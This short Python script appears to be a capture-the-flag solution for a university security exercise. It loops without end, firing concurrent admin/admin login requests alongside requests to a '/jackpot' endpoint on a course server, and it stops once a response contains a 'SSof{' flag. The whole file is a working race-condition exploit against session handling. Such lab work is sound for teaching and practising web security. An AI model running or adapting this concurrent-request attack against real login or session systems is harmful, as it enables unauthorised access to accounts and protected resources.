import grequests

SERVER='http://mustard.stt.rnl.tecnico.ulisboa.pt:22652'
SERVER_REGISTER='http://mustard.stt.rnl.tecnico.ulisboa.pt:22652/register'
SERVER_LOGIN='http://mustard.stt.rnl.tecnico.ulisboa.pt:22652/login'
JACKPOT='http://mustard.stt.rnl.tecnico.ulisboa.pt:22652/jackpot'

s = grequests.Session()
r = s.get(SERVER)

while True:

    data = {'username' : 'admin', 'password' : 'admin'}

    login = grequests.post(SERVER_LOGIN, data=data, session=s)
    jackpot = grequests.get(JACKPOT, session=s)

    res = grequests.map([login, jackpot])

    for r in res:
        print(r.text)
        if("SSof{" in r.text):
            exit()
